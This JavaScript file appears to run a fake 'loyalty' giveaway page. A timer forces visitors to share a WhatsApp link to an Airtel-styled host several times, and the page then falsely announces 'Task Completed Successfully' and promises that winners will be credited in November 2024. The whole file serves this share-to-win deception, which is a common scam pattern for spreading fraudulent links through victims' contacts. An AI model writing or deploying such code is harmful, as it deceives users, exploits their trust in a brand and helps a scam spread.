


function begin(self){
    
    if (!(self.start <= 0)){
        self.sharebtn.prop("disabled", true)
        self.start --;
        self.countdowntext.text("Next Share in "+self.start + "s")
    }else{
        self.start = self.initial;
        self.countdowntext.text("Next Share in "+self.start + "s")
        self.reset(self);
    };
}

function hideShow(self) {
    $("#sendlink").hide();
    $("#continue").removeClass("d-none");
    $(".continue").removeClass("bg-danger").addClass("bg-success")
    $(".task-icon").removeClass("text-danger bi bi-clipboard").addClass(" text-success bi bi-patch-check-fill");
    $(".task-status").removeClass("text-danger").text("Task Completed Successfully").addClass("text-success")
    $(".task-hide").text("Congratulations, youve successfully completed the verification and application process. If you are selected as one of the lucky winners, youll be credited on the 15th of November 2024.")
}

function updatetaskhide(self){
    $(".task-hide").text(5-self.shares +" Shares Left")
}



class CountDownTimer{
    constructor(start, updateclass, btnid){
        this.start = start;
        this.updateclass = updateclass
        this.btnid = btnid;
        this.countdowntext = $(this.updateclass)
        this.sharebtn = $(this.btnid);
        this.continuebtn = $("#continuebtn");
        this.countid = "";
        this.initial = start;
        this.shares = 0;
        this.countdowntext.hide()
    }
    initiateCountdown(){       
        var start = this.start;
        var self = this
        self.countid = setInterval(function(){
            begin(self);
        }, 1000)
        this.countdowntext.show()
    }
    reset(self){
        clearInterval(self.countid);
        self.start = self.initial
        self.sharebtn.prop("disabled", false)
        self.countdowntext.hide();
        self.shares ++;
        updatetaskhide(self);
        
        if (self.shares >= 4){
            hideShow(self);
        };
    };
};

function setHref(){
    var link = $("#sendlink");
    let a = Math.floor((Math.random() * 10) + 1);
    let b = Math.floor((Math.random() * 10) + 1);
    let c = Math.floor((Math.random() * 10) + 1);
    let d = Math.floor((Math.random() * 10) + 1);
    let e = Math.floor((Math.random() * 10) + 1);
    let f = Math.floor((Math.random() * 10) + 1);
    var url = "whatsapp://send?text=airtelloyalty.onrender.com/ref/"
    +a+""+b+""+c+""+d+""+e+""+f+"" ;
    link.prop("href", url)
}


$(document).ready(()=>{

 
    const counter = new CountDownTimer(20, ".countdown", "#sharebtn");
    var sharebtn = $("#sharebtn");
    var countdowntext = $(".countdown");
    
    sharebtn.click(()=>{
        counter.initiateCountdown()
    });
    
    setHref()
    
    
})